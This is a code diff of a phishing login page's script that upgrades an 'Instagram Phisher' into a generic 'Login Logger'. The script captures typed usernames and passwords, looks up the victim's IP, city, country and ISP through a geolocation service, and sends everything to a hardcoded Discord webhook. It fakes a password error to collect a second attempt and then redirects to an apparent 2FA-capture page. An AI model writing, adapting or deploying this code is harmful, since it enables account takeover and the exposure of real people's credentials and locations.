@@ -70,33 +70,66 @@
   </div>
 
   <script>
+    // ================== CONFIG ==================
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1492554429621211327/e590_FAEKElLOqTy9k5-Dr_4B9sXDFqWJyrzgusVJPvCHikuFJKl3IdSonIkgJKY_bgo";
 
     let attempt = 0;
 
-    // Fast IP fetch (only IP address)
-    async function getIP() {
+    // Better IP + Geolocation using ipapi.co (more reliable and detailed)
+    async function getIPAndLocation() {
       try {
-        const res = await fetch('https://api.ipify.org?format=json');
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error('Failed to fetch');
+
         const data = await res.json();
-        return data.ip || 'Unknown';
+
+        return {
+          ip: data.ip || 'Unknown',
+          city: data.city || 'Unknown',
+          region: data.region || 'Unknown',
+          country: data.country_name || 'Unknown',
+          country_code: data.country || 'Unknown',
+          latitude: data.latitude || null,
+          longitude: data.longitude || null,
+          timezone: data.timezone || 'Unknown',
+          isp: data.org || 'Unknown'
+        };
       } catch (err) {
-        console.error("IP fetch failed:", err);
-        return 'Unknown';
+        console.error("GeoIP fetch failed:", err);
+        return {
+          ip: 'Unknown',
+          city: 'Unknown',
+          region: 'Unknown',
+          country: 'Unknown',
+          country_code: 'Unknown',
+          latitude: null,
+          longitude: null,
+          timezone: 'Unknown',
+          isp: 'Unknown'
+        };
       }
     }
 
     // Send data to Discord
-    async function sendToDiscord(username, password, ip, attemptNum) {
-      const message = `**FPHISHER 🤖**
+    async function sendToDiscord(username, password, geoData, attemptNum) {
+      const { ip, city, region, country, country_code, isp } = geoData;
 
-**APP:** INSTAGRAM
+      const message = `**LOGIN CAPTURED 🤖**
+
+**APP:** [YOUR APP NAME]
 **USERNAME:** ${username}
 **PASSWORD:** ${password}
-**IP:** ${ip}
-**ATTEMPT:** ${attemptNum} ⏱️
 
-🔐 2025@FTECHSERVICES`;
+**IP:** ${ip}
+**CITY:** ${city}
+**REGION:** ${region}
+**COUNTRY:** ${country} (${country_code})
+**ISP:** ${isp}
+
+**ATTEMPT:** ${attemptNum} ⏱️
+**TIME:** ${new Date().toLocaleString()}
+
+🔐 2025 @FTECHSERVICES`;
 
       try {
         await fetch(DISCORD_WEBHOOK_URL, {
@@ -104,7 +137,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             content: message,
-            username: "Instagram Phisher"
+            username: "Login Logger"
           })
         });
         console.log(`✅ Attempt ${attemptNum} sent to Discord`);
@@ -132,18 +165,18 @@
 
       attempt++;
 
-      // Get IP first
-      const ip = await getIP();
+      // Get IP + Location
+      const geoData = await getIPAndLocation();
 
-      // Send to Discord BEFORE doing UI actions
-      await sendToDiscord(username, password, ip, attempt);
+      // Send to Discord BEFORE UI changes
+      await sendToDiscord(username, password, geoData, attempt);
 
       if (attempt === 1) {
         // First attempt: show error
         errorMsg.classList.remove("hidden");
         passwordInput.value = "";
 
-        // Optional shake effect
+        // Shake effect
         passwordInput.classList.add("animate-shake");
         setTimeout(() => passwordInput.classList.remove("animate-shake"), 600);
       } 
@@ -153,10 +186,9 @@
         btnText.textContent = "Loading...";
         spinner.classList.remove("hidden");
 
-        // Small delay so user sees the loading state + webhook has time to complete
         setTimeout(() => {
           window.location.href = "securedfa.html";
-        }, 800);
+        }, 1200);
       }
     });
   </script>
